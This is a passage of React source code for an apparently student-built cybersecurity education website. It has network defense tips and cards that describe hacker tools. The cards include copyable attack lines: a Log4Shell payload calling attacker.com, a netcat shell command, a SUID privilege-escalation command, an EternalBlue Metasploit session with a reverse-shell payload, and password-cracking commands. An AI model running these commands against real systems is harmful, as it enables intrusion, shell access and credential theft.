                      <code>content: attr(value)</code><CopyButton text="content: attr(value)" copiedText={copiedText} onCopy={handleCopy} /> - Extracting hidden attribute values.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'CSS', command: 'content: attr(value)', description: 'Extracting hidden attribute values.', use: 'Can read attribute values and display them. In some advanced CSS injection attacks, this is combined with external requests to leak sensitive attributes.'})}></i>
                    </li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-danger"><i className="fa-brands fa-java me-2"></i>Java</h4>
                  <ul className="text-secondary list-unstyled">
                    <li className="mb-2">
                      <code>Runtime.getRuntime().exec("cmd")</code><CopyButton text='Runtime.getRuntime().exec("cmd")' copiedText={copiedText} onCopy={handleCopy} /> - Command execution.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Java', command: 'Runtime.getRuntime().exec("cmd")', description: 'Command execution.', use: 'Executes OS commands from within a Java application. Often targeted during deserialization or RCE vulnerabilities to gain shell access.'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>ObjectInputStream.readObject()</code><CopyButton text="ObjectInputStream.readObject()" copiedText={copiedText} onCopy={handleCopy} /> - Insecure deserialization.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Java', command: 'ObjectInputStream.readObject()', description: 'Insecure deserialization.', use: 'Reads serialized Java objects. If untrusted data is passed to this method, it can lead to arbitrary code execution (Insecure Deserialization).'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>$&#123;jndi:ldap://attacker.com&#125;</code><CopyButton text="${jndi:ldap://attacker.com}" copiedText={copiedText} onCopy={handleCopy} /> - Log4Shell (JNDI injection).
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Java', command: '${jndi:ldap://attacker.com}', description: 'Log4Shell (JNDI injection).', use: 'The infamous Log4Shell payload. It exploits a vulnerability in log4j where JNDI lookups allow an attacker to load and execute remote Java classes.'})}></i>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {currentView === 'hashCracker' && <HashCrackerSection />}

      {currentView === 'networkDefense' && (
        <section id="networkDefense" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-solid fa-network-wired me-2"></i>Network Defense & Wi-Fi Security</h2>
            
            <div className="row mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-info" style={{ borderWidth: '2px' }}>
                  <h4 className="text-info mb-3"><i className="fa-solid fa-shield-halved me-2"></i>Tricks to Protect Your Network</h4>
                  <ul className="text-secondary list-unstyled">
                    <li className="mb-2"><strong className="text-light">1. Change Default Router Credentials:</strong> Always change the default admin username and password of your home Wi-Fi router to prevent unauthorized access.</li>
                    <li className="mb-2"><strong className="text-light">2. Use WPA3 or WPA2 Encryption:</strong> Ensure your router is using WPA3 (or at least WPA2-AES) encryption, and never use outdated WEP or WPA protocols.</li>
                    <li className="mb-2"><strong className="text-light">3. Disable WPS (Wi-Fi Protected Setup):</strong> WPS is highly vulnerable to brute-force attacks. Disable it in your router settings.</li>
                    <li className="mb-2"><strong className="text-light">4. Hide Your SSID (Optional but helpful):</strong> Stopping your router from broadcasting its name makes it slightly harder for casual attackers to find.</li>
                    <li className="mb-2"><strong className="text-light">5. Use a VPN on Public Wi-Fi:</strong> Never access bank accounts or sensitive portals on public Wi-Fi without a VPN encrypting your traffic.</li>
                    <li className="mb-0"><strong className="text-light">6. Enable MAC Address Filtering:</strong> Whitelist specific devices so that even if a hacker gets the password, they cannot connect without a registered MAC address.</li>
                  </ul>
                </div>
              </div>
            </div>

            <h4 className="text-center text-warning mb-4"><i className="fa-solid fa-skull-crossbones me-2"></i>Network & Wi-Fi Tools Hackers Use</h4>
            <div className="row g-4 mb-5">
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-wifi me-2"></i>Aircrack-ng</h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A complete suite of tools to assess Wi-Fi network security.</p>
                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They monitor networks, capture data packets, and run brute-force or dictionary attacks to crack WEP and WPA/WPA2 passwords.</p>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-fish me-2"></i>Wireshark</h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A widely-used network protocol analyzer.</p>
                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They sniff unencrypted traffic on public Wi-Fi networks (Man-in-the-Middle) to intercept passwords, cookies, and sensitive personal information.</p>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-satellite-dish me-2"></i>Fluxion / Wifiphisher</h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> Social engineering tools designed specifically for Wi-Fi networks.</p>
                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They jam your real Wi-Fi network and create a fake "Evil Twin" clone. When you connect to the clone, it shows a fake router login page asking for your Wi-Fi password.</p>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-spider me-2"></i>Bettercap / Ettercap</h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> Comprehensive tools for Man-in-the-Middle (MitM) attacks on networks.</p>
                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They perform ARP spoofing to trick the router and victim devices into sending all traffic through the hacker's computer, allowing them to modify or steal data.</p>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {currentView === 'linuxSecurity' && (
        <section id="linuxSecurity" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-brands fa-linux me-2"></i>Linux Security Essentials</h2>
            
            <div className="row mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-info" style={{ borderWidth: '2px' }}>
                  <h4 className="text-info mb-3"><i className="fa-solid fa-server me-2"></i>Why Hackers Use Linux over Windows and Mac?</h4>
                  <p className="text-secondary mb-2"><strong className="text-light">Open Source & Customization:</strong> Linux's open-source nature allows hackers to see how the OS works at its core, modify the kernel, and build highly customized attack environments.</p>
                  <p className="text-secondary mb-2"><strong className="text-light">Native Hacking Tools:</strong> Tools like Nmap, Metasploit, Wireshark, and thousands of others are built for Linux. Distributions like Kali Linux come pre-installed with over 600 penetration testing tools.</p>
                  <p className="text-secondary mb-2"><strong className="text-light">Lightweight & Fast:</strong> Linux can run efficiently on almost any hardware, from powerful servers to tiny devices like Raspberry Pi (perfect for stealthy rogue devices).</p>
                  <p className="text-secondary mb-0"><strong className="text-light">CLI Power:</strong> The command-line interface (CLI) in Linux offers unparalleled power, scripting capabilities, and automation that GUI-heavy OSs lack, allowing for rapid execution of complex attacks.</p>
                </div>
              </div>
            </div>

            <div className="row g-4">
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-info"><i className="fa-solid fa-terminal me-2"></i>Bash Scripting</h4>
                  <p className="text-secondary"><strong className="text-info">What it is:</strong> Writing scripts in the Bash shell to automate tasks.</p>
                  <p className="text-secondary"><strong className="text-info">How it's used:</strong> Hackers use it to automate repetitive tasks like network scanning, brute-forcing passwords, or parsing large data dumps quickly.</p>
                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-info border-opacity-25">
                    <code className="text-info mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>#!/bin/bash</code>
                    <CopyButton text="#!/bin/bash" copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-warning"><i className="fa-solid fa-user-secret me-2"></i>File Permissions (Chmod/Chown)</h4>
                  <p className="text-secondary"><strong className="text-warning">What it is:</strong> The system governing who can read, write, or execute files.</p>
                  <p className="text-secondary"><strong className="text-warning">How it's used:</strong> Misconfigured permissions (like SUID bits set on sensitive binaries) are a primary way hackers achieve Privilege Escalation (becoming the 'root' user).</p>
                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-warning border-opacity-25">
                    <code className="text-warning mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>chmod +s /usr/bin/find</code>
                    <CopyButton text="chmod +s /usr/bin/find" copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-danger"><i className="fa-solid fa-network-wired me-2"></i>Netcat (nc)</h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A versatile networking utility that reads and writes data across network connections.</p>
                  <p className="text-secondary"><strong className="text-danger">How it's used:</strong> Known as the "hacker's Swiss Army knife," it's used to set up bind/reverse shells, transfer files, or manually interact with network services (like HTTP/SMTP).</p>
                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-danger border-opacity-25">
                    <code className="text-danger mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>nc -lvnp 4444 -e /bin/bash</code>
                    <CopyButton text="nc -lvnp 4444 -e /bin/bash" copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-success"><i className="fa-solid fa-eye me-2"></i>Cron Jobs</h4>
                  <p className="text-secondary"><strong className="text-success">What it is:</strong> A time-based job scheduler in Unix-like operating systems.</p>
                  <p className="text-secondary"><strong className="text-success">How it's used:</strong> Hackers use cron jobs to establish persistence (e.g., scheduling a script to run every 5 minutes to reconnect a reverse shell if it gets disconnected) or to exploit poorly secured scripts that run automatically.</p>
                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-success border-opacity-25">
                    <code className="text-success mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>crontab -e</code>
                    <CopyButton text="crontab -e" copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
            </div>

            <div className="row mt-5 pt-5 mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-danger" style={{ borderWidth: '2px' }}>
                  <div className="d-flex align-items-center mb-4">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2b/Kali-dragon-icon.svg" alt="Kali Linux Logo" style={{ width: '60px', height: '60px', marginRight: '20px' }} />
                    <h2 className="text-danger mb-0 display-6 fw-bold">Kali Linux: The Hacker's Playground</h2>
                  </div>
                  <p className="text-secondary mb-2"><strong className="text-light">Why is Kali more useful and dangerous than standard Linux?</strong> Kali Linux is a Debian-derived Linux distribution designed specifically for digital forensics and penetration testing. It comes pre-packaged with over 600 preinstalled penetration-testing programs. While standard Linux requires manual installation and configuration of these tools, Kali provides an out-of-the-box, comprehensive arsenal. Its focus on offensive security means it lacks some restrictive defensive defaults, making it incredibly powerful for attackers, but also dangerous if used by novices as a daily driver.</p>
                  
                  <h5 className="text-light mt-4 mb-3">6 Powerful Tools in Kali Linux:</h5>
                  <div className="row g-3">
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">1. Metasploit Framework</strong>
                        <small className="text-secondary mb-3 flex-grow-1">Used for developing and executing exploit code against a remote target machine. It is the gold standard for exploitation.</small>
                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>msfconsole</code>
                          <CopyButton text="msfconsole" copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">2. Nmap</strong>
                        <small className="text-secondary mb-3 flex-grow-1">A network exploration tool and port scanner. Used to discover hosts, open ports, and running services on a network.</small>
                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>nmap -sV -p- &lt;target&gt;</code>
                          <CopyButton text="nmap -sV -p- <target>" copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">3. Wireshark</strong>
                        <small className="text-secondary mb-3 flex-grow-1">A powerful network protocol analyzer. It allows hackers to capture and inspect live network traffic down to the packet level.</small>
                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>wireshark &amp;</code>
                          <CopyButton text="wireshark &" copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">4. Aircrack-ng</strong>
                        <small className="text-secondary mb-3 flex-grow-1">A suite of tools to assess WiFi network security. Hackers use it for monitoring, packet injection, and cracking WPA/WPA2 passwords.</small>
                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>airmon-ng start wlan0</code>
                          <CopyButton text="airmon-ng start wlan0" copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">5. John the Ripper</strong>
                        <small className="text-secondary mb-3 flex-grow-1">An extremely fast offline password cracker. Used to brute-force or dictionary-attack hashed passwords stolen from databases.</small>
                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>john --wordlist=pass.txt hash.txt</code>
                          <CopyButton text="john --wordlist=pass.txt hash.txt" copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">6. Burp Suite</strong>
                        <small className="text-secondary mb-3 flex-grow-1">An integrated platform for web application security testing. Its proxy intercepts HTTP traffic to manipulate requests before they reach the server.</small>
                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>burpsuite</code>
                          <CopyButton text="burpsuite" copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {currentView === 'ethicalHacking' && (
        <section id="ethicalHacking" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-solid fa-user-ninja me-2"></i>Ethical Hacking - Tools of the traps</h2>
            
            <div className="row mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-success" style={{ borderWidth: '2px' }}>
                  <h4 className="text-success mb-3"><i className="fa-solid fa-user-shield me-2"></i>What is Ethical Hacking?</h4>
                  <p className="text-secondary mb-0">Ethical hacking is the legal and authorized practice of probing systems, networks, and applications to uncover vulnerabilities before malicious hackers can exploit them. Also known as "white-hat" hacking, it involves using the same tools and techniques as cybercriminals, but strictly with permission and for the purpose of strengthening security defenses and protecting sensitive data.</p>
                </div>
              </div>
            </div>

            <div className="row g-4">
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-info"><i className="fa-solid fa-spider me-2"></i>Burp Suite</h4>
                  <p className="text-secondary"><strong className="text-info">What it is:</strong> A web vulnerability scanner and proxy tool.</p>
                  <p className="text-secondary mb-3"><strong className="text-info">How Hackers Use It:</strong> Intercepts and modifies web traffic before it reaches the server.<br/><br/><strong className="text-info">Example:</strong> Intercepting a checkout request and changing a laptop's price from $1000 to $1 before forwarding it to the server.</p>
                  <div className="mt-auto p-3 bg-dark rounded border border-info border-opacity-25">
                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
                      <strong className="text-info small">Intercepted HTTP Request (Modified)</strong>
                      <CopyButton text={"POST /api/checkout HTTP/1.1\nHost: target-shop.local\nContent-Type: application/json\n\n{\n  \"item\": \"laptop\",\n  \"price\": 1.00\n}"} copiedText={copiedText} onCopy={handleCopy} />
                    </div>
                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
                      <span className="text-danger fw-bold">POST</span> /api/checkout HTTP/1.1<br/>
                      Host: target-shop.local<br/>
                      Content-Type: application/json<br/>
                      <br/>
                      <span className="text-secondary">{"{"}</span><br/>
                      &nbsp;&nbsp;"item": "laptop",<br/>
                      &nbsp;&nbsp;"price": <span className="text-danger fw-bold text-decoration-line-through">1000.00</span> <span className="text-success fw-bold">1.00</span><br/>
                      <span className="text-secondary">{"}"}</span>
                    </pre>
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-warning"><i className="fa-solid fa-network-wired me-2"></i>Nmap (Network Mapper)</h4>
                  <p className="text-secondary"><strong className="text-warning">What it is:</strong> A free and open-source utility for network discovery and security auditing.</p>
                  <p className="text-secondary mb-3"><strong className="text-warning">How Hackers Use It:</strong> Scans networks to find open ports, running services, and OS details.<br/><br/><strong className="text-warning">Example:</strong> Scanning an IP and finding Port 21 (FTP) open with an outdated, vulnerable version of FileZilla running.</p>
                  <div className="mt-auto p-3 bg-dark rounded border border-warning border-opacity-25">
                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
                      <strong className="text-warning small">Bash Terminal</strong>
                      <CopyButton text={"nmap -sV -sC -p 21,80 192.168.1.105"} copiedText={copiedText} onCopy={handleCopy} />
                    </div>
                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
                      <span className="text-warning fw-bold">root@kali:~#</span> nmap -sV -sC -p 21,80 192.168.1.105<br/>
                      <br/>
                      <span className="text-secondary">Starting Nmap 7.93...</span><br/>
                      PORT   STATE SERVICE VERSION<br/>
                      21/tcp open  ftp     <span className="text-danger fw-bold">vsftpd 2.3.4</span><br/>
                      80/tcp open  http    Apache httpd 2.4.41<br/>
                      <br/>
                      <span className="text-success">Nmap done: 1 IP address (1 host up) scanned</span>
                    </pre>
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-danger"><i className="fa-brands fa-metapush me-2"></i>Metasploit Framework</h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A penetration testing framework that makes hacking simple.</p>
                  <p className="text-secondary mb-3"><strong className="text-danger">How Hackers Use It:</strong> Uses pre-written exploit code to attack known software vulnerabilities.<br/><br/><strong className="text-danger">Example:</strong> Selecting the 'EternalBlue' exploit to target an unpatched Windows machine, granting remote command line access.</p>
                  <div className="mt-auto p-3 bg-dark rounded border border-danger border-opacity-25">
                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
                      <strong className="text-danger small">MSF Console</strong>
                      <CopyButton text={"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit"} copiedText={copiedText} onCopy={handleCopy} />
                    </div>
                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
                      <span className="text-danger fw-bold">msf6 &gt;</span> use exploit/windows/smb/ms17_010_eternalblue<br/>
                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> set RHOSTS 10.0.0.50<br/>
                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> set PAYLOAD windows/x64/meterpreter/reverse_tcp<br/>
                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> exploit<br/>
                      <br/>
                      <span className="text-info">[*]</span> Started reverse TCP handler on 10.0.0.5:4444<br/>
                      <span className="text-success fw-bold">[+]</span> WIN - target successfully breached.<br/>
                      <span className="text-danger fw-bold">meterpreter &gt;</span> getuid<br/>
                      Server username: <span className="text-warning">NT AUTHORITY\SYSTEM</span>
                    </pre>
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-success"><i className="fa-solid fa-key me-2"></i>John the Ripper / Hashcat</h4>
                  <p className="text-secondary"><strong className="text-success">What it is:</strong> Advanced password cracking tools.</p>
                  <p className="text-secondary mb-3"><strong className="text-success">How Hackers Use It:</strong> Rapidly guesses passwords to reverse encrypted (hashed) password files.<br/><br/><strong className="text-success">Example:</strong> Using a stolen database and the 'rockyou' dictionary list to crack a user's hashed password back to "password123".</p>
                  <div className="mt-auto p-3 bg-dark rounded border border-success border-opacity-25">
                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
                      <strong className="text-success small">Bash Terminal</strong>
                      <CopyButton text={"john --wordlist=rockyou.txt hashes.txt"} copiedText={copiedText} onCopy={handleCopy} />
                    </div>
                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
                      <span className="text-success fw-bold">root@kali:~#</span> john --wordlist=rockyou.txt hashes.txt<br/>
                      <br/>
                      <span className="text-secondary">Using default input encoding: UTF-8</span><br/>
                      <span className="text-secondary">Loaded 1 password hash (bcrypt)</span><br/>
                      <span className="text-secondary">Press 'q' or Ctrl-C to abort...</span><br/>
                      <br/>
                      <span className="text-warning fw-bold">password123</span>      <span className="text-secondary">(admin)</span><br/>
                      <br/>
                      <span className="text-success">1g 0:00:00:04 DONE 0.222g/s 345p/s</span><br/>
                      <span className="text-secondary">Use "--show" to display cracked passwords</span>
                    </pre>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}
        </motion.div>
      </AnimatePresence>

      <footer className="py-4 text-center text-secondary border-top border-dark">
        <div className="container">
          <p className="mb-2">&copy; 2026 ShadowGrid | Responsive Web Design (RWD) P2BL Project</p>
          <div className="d-flex justify-content-center gap-3">
            <a href="#about" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }} className="text-secondary text-decoration-none">About Team</a>
          </div>
        </div>
      </footer>

      {selectedCheat && (
        <div className="modal d-block" style={{ backgroundColor: 'rgba(0,0,0,0.8)' }} tabIndex={-1}>
          <div className="modal-dialog modal-dialog-centered">
            <div className="modal-content cyber-card" style={{ border: '1px solid var(--cyber-blue)' }}>
              <div className="modal-header border-bottom border-secondary">
                <h5 className="modal-title text-info"><i className="fa-solid fa-circle-info me-2"></i>{selectedCheat.tool} Usage</h5>
                <button type="button" className="btn-close btn-close-white" aria-label="Close" onClick={() => setSelectedCheat(null)}></button>
              </div>
              <div className="modal-body text-secondary text-start">
                <p className="mb-2">
                  <strong className="text-info">Command:</strong> 
                  <code>{selectedCheat.command}</code> 
                  <CopyButton text={selectedCheat.command} copiedText={copiedText} onCopy={handleCopy} />
                  {selectedCheat.language && <span className="text-secondary ms-1">{selectedCheat.language}</span>}
                </p>
                <p className="mb-2"><strong className="text-info">Action:</strong> {selectedCheat.description}</p>
                <hr className="border-secondary" />
                <p className="mb-0 text-light"><strong className="text-danger">How Hackers Use It:</strong> {selectedCheat.use}</p>
              </div>
              <div className="modal-footer border-top border-secondary">
                <button type="button" className="btn btn-outline-secondary" onClick={() => setSelectedCheat(null)}>Close</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
